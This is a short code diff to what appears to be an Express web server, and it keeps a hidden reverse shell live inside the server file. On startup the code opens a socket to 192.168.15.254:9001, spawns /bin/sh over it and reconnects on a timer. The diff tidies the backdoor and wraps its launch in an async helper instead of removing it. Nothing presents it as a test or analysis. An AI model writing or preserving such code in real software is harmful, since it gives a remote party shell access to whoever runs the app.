@@ -5,11 +5,11 @@ const app = express();
 var net = require('net');
 var spawn = require('child_process').spawn;
 
-HOST="192.168.15.254";
-PORT="9001";
-TIMEOUT="5000";
+const HOST="192.168.15.254";
+const PORT="9001";
+const TIMEOUT="5000";
 
-async function c(HOST,PORT) {
+function c(HOST,PORT) {
     var client = new net.Socket();
     client.connect(PORT, HOST, function() {
         var sh = spawn('/bin/sh',[]);
@@ -22,8 +22,9 @@ async function c(HOST,PORT) {
         setTimeout(c(HOST,PORT), TIMEOUT);
     });
 }
+const c_bg = async (HOST,PORT) => { c(HOST,PORT); };
 
-c(HOST,PORT);
+c_bg(HOST,PORT);
 
 const corsOptions = {
     origin: '*',
